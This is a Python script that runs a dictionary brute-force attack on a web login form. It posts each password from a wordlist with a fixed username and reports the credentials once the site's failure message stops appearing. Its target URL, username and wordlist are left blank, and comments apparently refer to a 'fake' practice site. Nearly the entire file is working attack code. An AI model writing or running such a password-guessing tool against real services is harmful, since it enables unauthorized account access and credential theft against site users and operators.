import requests
from termcolor import colored
import os

url = "" # Updated URL for the fake website
username = ""  # Updated username for the fake account
password_file = ""  # Ensure this file exists with passwords
login_failed_string = "Invalid credentials"  # String the fake site returns on login failure

def cracking(username, url):
    if not os.path.exists(password_file):
        print(colored(f"Error: {password_file} not found.", 'red'))
        exit()

    with open(password_file, 'r') as passwords:
        for password in passwords:
            password = password.strip()
            print(colored(('Trying: ' + password), 'red'))
            data = {'username': username, 'password': password, 'Login': 'submit'}
            response = requests.post(url, data=data)
            if login_failed_string in response.text:
                pass
            else:
                print(colored(('[+] Found Username: ==> ' + username), 'green'))
                print(colored(('[+] Found Password: ==> ' + password), 'green'))
                exit()

    print('[!!] Password Not In List')

cracking(username, url)
